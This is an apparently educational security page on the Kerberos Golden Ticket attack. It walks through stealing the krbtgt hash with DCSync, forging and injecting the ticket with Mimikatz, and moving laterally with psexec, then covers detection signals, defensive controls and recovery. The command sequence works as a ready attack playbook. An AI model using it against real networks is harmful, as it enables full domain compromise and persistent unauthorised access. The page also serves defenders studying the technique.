# 🎫 Golden Ticket

### <mark style="color:$primary;">What It Is</mark>

A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT). Because it is forged using the krbtgt account's NT hash, it is indistinguishable from a legitimate TGT issued by the real KDC.

A Golden Ticket gives an attacker the ability to authenticate as any user, to any service, in the domain — for as long as the forged ticket is valid. Without needing that user's password. Without touching the DC again.

***

### Why It Is the End State of Domain Compromise

```
Normal TGT:
  Issued by the KDC
  Encrypted with krbtgt NT hash
  Contains PAC (user SIDs, group memberships)
  Valid for 10 hours

Golden Ticket:
  Created by the attacker using Mimikatz
  Encrypted with krbtgt NT hash (which attacker stole)
  Contains FORGED PAC (attacker chooses any SIDs, any groups)
  Can be set valid for 10 years
  Works even if the target user's password is changed
  Works even if the target user account is deleted
```

The Golden Ticket bypasses the DC entirely for service access. The forged TGT is presented to services directly. Services validate it cryptographically — and it passes, because the krbtgt hash is correct.

***

### Prerequisites

```
Required: krbtgt NT hash

Obtained via:
  • DCSync attack (most common in domain environments)
  • Physical access to DC → NTDS.dit extraction
  • Volume Shadow Copy abuse
  • Memory dump of DC (LSASS process)

Also needed:
  • Domain name (FQDN)
  • Domain SID
  • Username to impersonate (can be any string — even fake)
```

***

### The Attack — Step by Step

#### Step 1 — Obtain krbtgt Hash via DCSync

```
Mimikatz on a Domain Admin session:
lsadump::dcsync /user:krbtgt

Output includes:
  Hash NTLM: 1a2b3c4d5e6f... ← this is what you need
```

#### Step 2 — Gather Domain Information

```
PowerShell:
(Get-ADDomain).DomainSID.Value
→ S-1-5-21-1234567890-...

(Get-ADDomain).DNSRoot
→ bank.local
```

#### Step 3 — Forge the Golden Ticket

```
Mimikatz:
kerberos::golden /user:FakeAdmin
                 /domain:bank.local
                 /sid:S-1-5-21-1234567890-...
                 /krbtgt:1a2b3c4d5e6f...
                 /id:500
                 /groups:512,519,520
                 /ticket:golden.kirbi

Parameters:
  /user    → can be any username, even a fake one
  /id:500  → RID 500 = built-in Administrator
  /groups  → 512=Domain Admins, 519=Enterprise Admins
  /ticket  → saves the forged TGT to a file
```

#### Step 4 — Inject and Use

```
Mimikatz:
kerberos::ptt golden.kirbi
→ Injects the forged TGT into current session

Now:
  dir \\dc01.bank.local\c$          ← admin access to DC
  psexec \\any-server cmd.exe       ← shell on any server
  Access any resource in the domain
```

***

### What Makes It Persistent

```
The Golden Ticket is valid even if:
  • The impersonated user changes their password
  • The impersonated user account is disabled
  • The impersonated user account is deleted
  • Group memberships of the user are changed

Because the validation happens using:
  → The forged ticket's cryptographic signature (krbtgt hash)
  → The PAC inside the ticket (fully attacker-controlled)
  NOT the current state of the AD user object

The only way to invalidate existing Golden Tickets:
  Rotate the krbtgt password TWICE
  (single rotation still leaves old tickets valid
   because the previous hash is cached temporarily)
```

***

### Detection

Golden Tickets are difficult to detect by design. The forged TGT looks legitimate to all cryptographic checks.

```
Anomaly indicators:
  • Ticket lifetime unusually long (default is 10h — Golden Tickets
    are often set for years)
  • Event 4769 (TGS-REQ) with no preceding Event 4768 (AS-REQ)
    (Golden Ticket skips the AS exchange — no AS-REQ logged)
  • User attributes in the ticket don't match AD
    (e.g. ticket claims Domain Admin but user is not in that group)

Microsoft Defender for Identity:
  Specifically detects Golden Ticket anomalies:
    → Forged PAC signatures
    → Non-existent account names in tickets
    → Overlong ticket lifetimes
```

***

### The Silver Ticket — Related Concept

While a Golden Ticket forges a TGT (valid for the entire domain), a **Silver Ticket** forges a Service Ticket (valid for one specific service).

```
Golden Ticket:
  Forged with: krbtgt hash
  Valid for:   entire domain — any service
  Requires:    krbtgt hash (highest privilege)

Silver Ticket:
  Forged with: service account hash
  Valid for:   that specific service only
  Requires:    service account hash (lower barrier)
  Stealthier:  no KDC communication needed at all
```

***

### Defensive Takeaways

| Control                                              | Why It Matters                                        |
| ---------------------------------------------------- | ----------------------------------------------------- |
| Protect the krbtgt hash above all else               | No krbtgt hash = no Golden Ticket                     |
| Rotate krbtgt password twice after any DC compromise | Single rotation is insufficient                       |
| Monitor for Event 4769 without preceding 4768        | Indicates ticket injection — bypassed AS exchange     |
| Microsoft Defender for Identity                      | Built-in Golden Ticket anomaly detection              |
| Limit DA credentials exposure                        | Fewer DA sessions = fewer DCSync opportunities        |
| Enable PAC validation on services                    | Some services can be configured to verify PAC with DC |

***

### The Full Attack Chain in Context

```
Start: phishing email → low-privilege domain user

1. Kerberoasting
   Low-privilege user requests service tickets
   Cracks service account password offline
   Lateral movement begins

2. Escalation
   Service account has local admin on a server
   Mimikatz dumps credentials from that server's memory
   Domain Admin credentials found in cache

3. DCSync
   Domain Admin runs Mimikatz
   lsadump::dcsync /user:krbtgt
   krbtgt hash obtained

4. Golden Ticket
   Forge TGT as any user, any group
   Persistent access regardless of password changes
   Full domain control — indefinitely

Recovery required:
  Rotate krbtgt twice
  Audit all DA accounts for compromise
  Review all changes made during attacker dwell time
  Consider full domain rebuild in severe cases
```
